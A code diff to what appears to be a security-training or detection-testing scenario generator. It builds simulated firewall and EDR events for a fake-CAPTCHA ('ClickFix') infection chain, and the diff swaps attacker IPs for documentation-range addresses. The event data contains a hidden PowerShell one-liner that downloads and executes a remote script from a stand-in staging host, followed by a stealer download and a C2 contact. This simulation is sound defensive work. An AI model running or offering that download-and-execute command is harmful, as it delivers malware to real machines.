@@ -72,7 +72,7 @@ export function clickFixFakeCaptchaScenarioEvents() {
     panWeb({
       ...cs, id: "evt_cfc_01_lure_page", ts: T(0), severity: "low",
       url: `https://${lurePage}/templates/free-download`, domain: lurePage,
-      category: "computer-and-internet-info", action: "alert", dstIp: "146.190.62.4", status: 200, bytesIn: 61_204,
+      category: "computer-and-internet-info", action: "alert", dstIp: "203.0.113.4", status: 200, bytesIn: 61_204,
       userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
       userTitle: "Sales Development Representative",
       description: "WS-3387 loaded a 'free invoice template' page on invoice-templates-pro.com at 14:10, allowed under the category computer-and-internet-info.",
@@ -82,7 +82,7 @@ export function clickFixFakeCaptchaScenarioEvents() {
     panWeb({
       ...cs, id: "evt_cfc_02_widget_fetch", ts: T(45_000), severity: "low",
       url: `https://${widgetHost}/widget/captcha.js`, domain: widgetHost,
-      category: "computer-and-internet-info", action: "alert", dstIp: "185.207.14.92", status: 200, bytesIn: 9_872,
+      category: "computer-and-internet-info", action: "alert", dstIp: "203.0.113.92", status: 200, bytesIn: 9_872,
       referer: `https://${lurePage}/templates/free-download`,
       description: "Forty-five seconds later the page loaded /widget/captcha.js from human-verify-check.net, referred by the invoice-templates-pro.com page.",
     }),
@@ -113,15 +113,15 @@ export function clickFixFakeCaptchaScenarioEvents() {
     // 3b. The first PowerShell resolves and contacts the staging host; its script content is scanned in memory.
     csDns({
       ...cs, id: "evt_cfc_03b_dns_stager", ts: T(2 * MIN + 52_000), severity: "medium",
-      domain: stagingHost, resolvedIp: "91.223.104.17",
+      domain: stagingHost, resolvedIp: "203.0.113.87",
       processName: "powershell.exe", pid: 8840, processPath: PS_PATH, parentName: "explorer.exe", parentPid: 3912,
       description: "powershell.exe (pid 8840) on WS-3387 resolved pkg-delivery-cdn.net.",
     }),
     csNetwork({
       ...cs, id: "evt_cfc_03c_connect_stager", ts: T(2 * MIN + 52_500), severity: "medium",
-      remoteIp: "91.223.104.17", remotePort: 443, application: "tls", domain: stagingHost,
+      remoteIp: "203.0.113.87", remotePort: 443, application: "tls", domain: stagingHost,
       processName: "powershell.exe", pid: 8840, processPath: PS_PATH, parentName: "explorer.exe", parentPid: 3912,
-      description: "powershell.exe (pid 8840) on WS-3387 connected to 91.223.104.17:443.",
+      description: "powershell.exe (pid 8840) on WS-3387 connected to 203.0.113.87:443.",
     }),
     scriptScan("evt_cfc_03d_script_stager", 2 * MIN + 55_000, stagerScript,
       "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"", "C:\\Windows\\explorer.exe",
@@ -131,7 +131,7 @@ export function clickFixFakeCaptchaScenarioEvents() {
     panWeb({
       ...cs, id: "evt_cfc_04_stager_fetch", ts: T(2 * MIN + 53_000), severity: "medium",
       url: `https://${stagingHost}/v/init.ps1`, domain: stagingHost, category: "unknown",
-      action: "alert", dstIp: "91.223.104.17", status: 200, bytesIn: 8_192, mitre: "T1105", tactic: "Command and Control",
+      action: "alert", dstIp: "203.0.113.87", status: 200, bytesIn: 8_192, mitre: "T1105", tactic: "Command and Control",
       description: "Three seconds later the same host requested /v/init.ps1 from pkg-delivery-cdn.net, matching the URL in the PowerShell command line.",
     }),
 
@@ -150,22 +150,22 @@ export function clickFixFakeCaptchaScenarioEvents() {
       "Falcon scanned the decoded script the second PowerShell executed: it downloads sysupd32.exe into the Temp folder and starts it."),
     csDns({
       ...cs, id: "evt_cfc_05c_dns_stealer", ts: T(3 * MIN + 1_000), severity: "medium",
-      domain: stagingHost, resolvedIp: "91.223.104.17",
+      domain: stagingHost, resolvedIp: "203.0.113.87",
       processName: "powershell.exe", pid: 8901, processPath: PS_PATH, parentName: "powershell.exe", parentPid: 8840,
       description: "powershell.exe (pid 8901) on WS-3387 resolved pkg-delivery-cdn.net.",
     }),
     csNetwork({
       ...cs, id: "evt_cfc_05d_connect_stealer", ts: T(3 * MIN + 1_500), severity: "medium",
-      remoteIp: "91.223.104.17", remotePort: 443, application: "tls", domain: stagingHost,
+      remoteIp: "203.0.113.87", remotePort: 443, application: "tls", domain: stagingHost,
       processName: "powershell.exe", pid: 8901, processPath: PS_PATH, parentName: "powershell.exe", parentPid: 8840,
-      description: "powershell.exe (pid 8901) on WS-3387 connected to 91.223.104.17:443.",
+      description: "powershell.exe (pid 8901) on WS-3387 connected to 203.0.113.87:443.",
     }),
 
     // 5b. The encoded command's download of the second stage, as the firewall saw it.
     panWeb({
       ...cs, id: "evt_cfc_05b_stealer_fetch", ts: T(3 * MIN + 2_000), severity: "high",
       url: `https://${stagingHost}/v/sysupd32.exe`, domain: stagingHost, category: "unknown",
-      action: "alert", dstIp: "91.223.104.17", status: 200, bytesIn: 892_416,
+      action: "alert", dstIp: "203.0.113.87", status: 200, bytesIn: 892_416,
       file: { name: "sysupd32.exe", path: "/v/sysupd32.exe", sha256: stealerHash, size: 892_416 },
       fileType: "pe", mitre: "T1105", tactic: "Command and Control",
       description: "The child PowerShell then fetched /v/sysupd32.exe from pkg-delivery-cdn.net, the file named in its decoded Base64 command line.",
@@ -190,22 +190,22 @@ export function clickFixFakeCaptchaScenarioEvents() {
 
     csDns({
       ...cs, id: "evt_cfc_07b_dns_c2", ts: T(3 * MIN + 11_000), severity: "high",
-      domain: c2, resolvedIp: "185.212.171.30",
+      domain: c2, resolvedIp: "203.0.113.31",
       processName: "sysupd32.exe", pid: 9014, processPath: STEALER_PATH, parentName: "powershell.exe", parentPid: 8901, sha256: stealerHash,
       description: "sysupd32.exe (pid 9014) on WS-3387 resolved sync-metrics-relay.com.",
     }),
     csNetwork({
       ...cs, id: "evt_cfc_07c_connect_c2", ts: T(3 * MIN + 11_500), severity: "high",
-      remoteIp: "185.212.171.30", remotePort: 443, application: "tls", domain: c2,
+      remoteIp: "203.0.113.31", remotePort: 443, application: "tls", domain: c2,
       processName: "sysupd32.exe", pid: 9014, processPath: STEALER_PATH, parentName: "powershell.exe", parentPid: 8901, sha256: stealerHash,
-      description: "sysupd32.exe (pid 9014) on WS-3387 connected to 185.212.171.30:443.",
+      description: "sysupd32.exe (pid 9014) on WS-3387 connected to 203.0.113.31:443.",
     }),
 
     // 8. Its outbound call is refused at the perimeter (block-url).
     panWeb({
       ...cs, id: "evt_cfc_08_c2_blocked", ts: T(3 * MIN + 12_000), severity: "high",
       url: `https://${c2}/s/2`, domain: c2, category: "newly-registered-domain", action: "block",
-      dstIp: "185.212.171.30", status: 0, mitre: "T1071.001", tactic: "Command and Control",
+      dstIp: "203.0.113.31", status: 0, mitre: "T1071.001", tactic: "Command and Control",
       description: "sysupd32.exe's outbound request to sync-metrics-relay.com was denied under the category newly-registered-domain.",
     }),
 
